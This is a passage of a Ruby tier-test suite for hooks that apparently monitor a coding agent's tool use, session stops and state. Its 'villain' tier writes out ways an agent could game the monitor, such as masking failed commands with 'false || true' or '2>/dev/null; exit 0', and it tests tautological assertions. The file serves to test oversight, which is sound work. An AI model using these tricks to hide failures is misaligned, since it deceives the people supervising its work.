         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test' },
      'tool_response' => { 'stderr' => 'bash: foo: command not found' }
    })
  end

  t.test(:hard, "error signature: PERMISSION_DENIED", expected_exit: 0,
         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test' },
      'tool_response' => { 'stderr' => 'Permission denied' }
    })
  end

  t.test(:hard, "error signature: BUILD_FAILED", expected_exit: 0,
         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test' },
      'tool_response' => { 'stderr' => 'Build failed with exit code 1' }
    })
  end

  # Empty research invalidation — set up research state first, then verify invalidation
  t.test(:hard, "empty research: WebSearch no results", expected_exit: 0,
         expected_output: 'RESEARCH INVALIDATED') do
    require_relative '../core/state_manager'
    StateManager.update(:research) { |r| r[:web] = Time.now.iso8601; r }
    result = t.run_hook({
      'tool_name' => 'WebSearch',
      'tool_input' => { 'query' => 'asdfqwerzxcv1234' },
      'tool_response' => { 'result' => 'No results found' }
    })
    result
  end

  # Non-empty Edit to non-test file — no tautology check
  t.test(:hard, "non-test file: no tautology check", expected_exit: 0,
         expected_not_output: 'RULE #7') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/app.swift',
        'new_string' => '#expect(true)'
      },
      'tool_response' => {}
    })
  end

  t.test(:hard, "Task agent: no error", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'find files' },
      'tool_response' => {}
    })
  end

  # --- VILLAIN TIER ---
  warn "\n  [VILLAIN] Gaming attempts"

  # Hidden errors: Bash with error text but no actual error field
  # detect_actual_failure checks stderr/error fields, not stdout content
  t.test(:villain, "hidden error: success with error text in stdout", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo "Error: something failed" && exit 0' },
      'tool_response' => { 'stdout' => 'Error: something failed' }
    })
  end

  t.test(:villain, "hidden error: partial success", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'command 2>/dev/null; exit 0' },
      'tool_response' => { 'stdout' => '' }
    })
  end

  t.test(:villain, "hidden error: ignored exit code", expected_exit: 0,
         expected_not_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'false || true' },
      'tool_response' => { 'stdout' => '' }
    })
  end

  # Empty research — invalidate_empty_research returns early on truly empty strings
  # (nothing to invalidate), so use "No results found" pattern instead
  t.test(:villain, "empty research: Grep zero matches", expected_exit: 0,
         expected_output: 'RESEARCH INVALIDATED') do
    require_relative '../core/state_manager'
    StateManager.update(:research) { |r| r[:local] = Time.now.iso8601; r }
    result = t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'nonexistent' },
      'tool_response' => { 'result' => '0 matches' }
    })
    result
  end

  # Read with truly empty result — hook returns early (nothing to invalidate)
  t.test(:villain, "empty research: Read empty file no-op", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/empty.txt' },
      'tool_response' => { 'result' => '' }
    })
  end

  # Actual error via error field
  t.test(:villain, "Edit error field", expected_exit: 0,
         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => { 'file_path' => '/tmp/test.rb' },
      'tool_response' => { 'error' => 'Edit conflict: file changed' }
    })
  end

  # Non-zero exit code detection
  t.test(:villain, "Bash non-zero exit code", expected_exit: 0,
         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'npm test' },
      'tool_response' => { 'exit_code' => 1, 'stdout' => 'FAIL src/test.js' }
    })
  end

  # Repeated error same signature
  t.test(:villain, "multiple errors same signature", expected_exit: 0,
         expected_output: '/rewind') do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test3' },
      'tool_response' => { 'stderr' => 'command not found' }
    })
  end

  t.summary
end

# === SANESTOP TESTS ===

def test_sanestop
  t = TierTest.new('sanestop')
  warn "\n=== SANESTOP TESTS ==="
  # Note: Meaningful sanestop behavior (verification blocking, score variance,
  # weasel words) is tested in sanestop_test.rb --self-test (13 tests).
  # These tier tests verify JSON parsing resilience and the stop_hook_active guard.

  warn "\n  [EASY] Core behavior"

  # stop_hook_active=true → immediate exit 0 (loop prevention)
  t.test(:easy, "stop_hook_active=true: immediate exit", expected_exit: 0,
         expected_not_output: 'Session Stats') do
    t.run_hook({ 'stop_hook_active' => true })
  end

  # stop_hook_active=false → runs full processing, reports stats
  t.test(:easy, "stop_hook_active=false: full processing", expected_exit: 0,
         expected_output: 'Session Stats') do
    # First ensure there are edits in state so stats show
    require_relative '../core/state_manager'
    StateManager.update(:edits) { |e| e[:count] = 1; e[:unique_files] = ['test.rb']; e }
    StateManager.update(:verification) { |v| v[:tests_run] = true; v }
    result = t.run_hook({ 'stop_hook_active' => false })
    # Clean up
    StateManager.reset(:edits)
    StateManager.reset(:verification)
    result
  end

  # Missing stop_hook_active key → defaults to false, runs processing
  t.test(:easy, "missing key: defaults to false", expected_exit: 0,
         expected_not_output: 'BLOCKED') do
    t.run_hook({ 'some_random_key' => 'value' })
  end

  warn "\n  [HARD] JSON resilience"

  # Valid JSON with unexpected keys — should not crash
  t.test(:hard, "valid JSON, unexpected keys", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({
      'completely' => 'unexpected',
      'data' => { 'nested' => true },
      'array' => [1, 2, 3]
    })
  end

  # Empty JSON object — should handle gracefully
  t.test(:hard, "empty JSON object", expected_exit: 0,
         expected_not_output: 'error') do
    t.run_hook({})
  end

  t.summary
end

# === M10: INTEGRATION TESTS ===
# Tests state flow between hooks - verifies hooks work as a system

def test_integration
  warn "\n=== INTEGRATION TESTS ==="
  passed = 0
  failed = 0

  # Test 1: State file exists and is valid JSON
  warn "\n  [STATE FLOW] State persistence"

  state_file = File.join(PROJECT_DIR, '.claude/state.json')
  if File.exist?(state_file)
    begin
      JSON.parse(File.read(state_file))
      warn "  ✅ State file is valid JSON"
      passed += 1
    rescue JSON::ParserError
      warn "  ❌ State file is invalid JSON"
      failed += 1
    end
  else
    warn "  ⚠️  State file doesn't exist (may be first run)"
    passed += 1
  end

  # Test 2: Saneprompt → Sanetools chain (prompt sets state, tools reads it)
  warn "\n  [CHAIN] Saneprompt → Sanetools"

  require 'open3'

  # Run saneprompt to set is_task state
  prompt_stdout, prompt_stderr, prompt_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'saneprompt.rb'),
    stdin_data: { 'user_prompt' => 'fix the bug' }.to_json
  )

  if prompt_status.exitstatus == 0
    warn "  ✅ Saneprompt processed task prompt (exit 0)"
    passed += 1
  else
    warn "  ❌ Saneprompt failed (exit #{prompt_status.exitstatus})"
    failed += 1
  end

  # Test 3: Sanetools allows research after prompt
  tools_stdout, tools_stderr, tools_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'sanetools.rb'),
    stdin_data: { 'tool_name' => 'Read', 'tool_input' => { 'file_path' => '/tmp/test.txt' } }.to_json
  )

  if tools_status.exitstatus == 0
    warn "  ✅ Sanetools allows Read after prompt (exit 0)"
    passed += 1
  else
    warn "  ❌ Sanetools blocked Read (exit #{tools_status.exitstatus})"
    failed += 1
  end

  # Test 4: Sanetrack tracks research
  track_stdout, track_stderr, track_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'sanetrack.rb'),
    stdin_data: {
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_result' => 'file contents'
    }.to_json
  )

  if track_status.exitstatus == 0
    warn "  ✅ Sanetrack processes Read result (exit 0)"
    passed += 1
  else
    warn "  ❌ Sanetrack failed (exit #{track_status.exitstatus})"
    failed += 1
  end

  # Test 5: Sanestop generates session stats
  warn "\n  [CHAIN] Session lifecycle"

  stop_stdout, stop_stderr, stop_status = Open3.capture3(
    { 'CLAUDE_PROJECT_DIR' => PROJECT_DIR, 'TIER_TEST_MODE' => 'true' },
    'ruby', File.join(HOOKS_DIR, 'sanestop.rb'),
    stdin_data: { 'stop_hook_active' => false }.to_json
  )

  if stop_status.exitstatus == 0
    warn "  ✅ Sanestop completes session (exit 0)"
    passed += 1
  else
    warn "  ❌ Sanestop failed (exit #{stop_status.exitstatus})"
    failed += 1
  end

  # Summary
  warn "\n  Integration: #{passed}/#{passed + failed} passed"

  {
    hook: 'INTEGRATION',
    passed: passed,
    failed: failed,
    skipped: 0,
    total: passed + failed,
    by_tier: { easy: passed, hard: 0, villain: 0 }
  }
end

# === MAIN ===

def reset_state_between_suites
  require_relative '../core/state_manager'
  StateManager.reset(:circuit_breaker)
  StateManager.reset(:research)
  StateManager.reset(:edits)
  StateManager.reset(:verification)
  StateManager.reset(:enforcement)
  StateManager.reset(:requirements)
rescue StandardError
  # Don't fail if state can't be reset
end

def run_all_tests
  warn "=" * 60
  warn "TIER TESTS: Easy, Hard, Villain"
  warn "=" * 60

  results = []
  reset_state_between_suites
  results << test_saneprompt
  reset_state_between_suites
  results << test_sanetools
  reset_state_between_suites
  results << test_sanetrack
  reset_state_between_suites
  results << test_sanestop
  reset_state_between_suites
  results << test_integration  # M10: Added integration tests

  warn "\n" + "=" * 60
  warn "SUMMARY"
  warn "=" * 60

  total_passed = 0
  total_failed = 0
  total_skipped = 0
  total_weak = 0

  results.each do |r|
    total_passed += r[:passed]
    total_failed += r[:failed]
    total_skipped += r[:skipped] || 0
    total_weak += r[:weak] || 0

    status = r[:failed] == 0 ? '✅' : '❌'
    weak_note = (r[:weak] || 0) > 0 ? " (#{r[:weak]} weak)" : ''
    warn "#{status} #{r[:hook].upcase}: #{r[:passed]}/#{r[:total]}#{weak_note} " \
         "(Easy: #{r[:by_tier][:easy]}, Hard: #{r[:by_tier][:hard]}, Villain: #{r[:by_tier][:villain]})"
  end

  warn ""
  weak_msg = total_weak > 0 ? ", #{total_weak} weak" : ''
  warn "TOTAL: #{total_passed}/#{total_passed + total_failed} passed#{weak_msg}, #{total_skipped} skipped"

  if total_failed > 0
    warn "\n#{total_failed} TESTS FAILED - Hooks need improvement"
    exit 1
  elsif total_weak > 0
    warn "\n#{total_weak} WEAK TESTS - only check default exit code, no real assertion"
    exit 0
  else
    warn "\nALL TESTS PASSED (0 weak)"
    exit 0
  end
end

if ARGV.include?('--self-test') || ARGV.empty?
  run_all_tests
end
